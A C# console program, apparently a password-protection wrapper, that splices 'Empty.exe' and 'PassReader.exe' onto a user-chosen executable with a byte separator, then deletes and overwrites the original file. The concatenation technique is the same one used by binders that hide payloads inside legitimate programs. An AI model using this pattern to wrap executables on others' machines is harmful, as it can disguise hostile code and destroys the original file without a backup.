using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Securer
{
    internal class Program
    {
        private static readonly string _firstProg = "Empty.exe";
        private static readonly string _secondProg = "PassReader.exe";
        private static string _thirdProg;

        static void Main()
        {
            Console.WriteLine("Введите путь к целевой программе:");
            _thirdProg = Console.ReadLine();

            if (!File.Exists(_thirdProg))
            {
                Console.WriteLine("Указанный файл не найден!");
                return;
            }

            if (!_thirdProg.EndsWith(".exe"))
            {
                Console.WriteLine("Ожидаемое расширение целевого файлы .exe");
                return;
            }

            var first = File.ReadAllBytes(_firstProg);
            var second = File.ReadAllBytes(_secondProg);
            var third = File.ReadAllBytes(_thirdProg);
            var separator = new byte[5] { 0xAB, 0xAC, 0xAD, 0xAE, 0xAF };
            var res = first.Concat(separator).Concat(second).Concat(separator).Concat(third).ToArray();

            File.Delete(_thirdProg);
            Task.Delay(TimeSpan.FromSeconds(1)).GetAwaiter().GetResult();

            File.WriteAllBytes(_thirdProg, res);
        }
    }
}
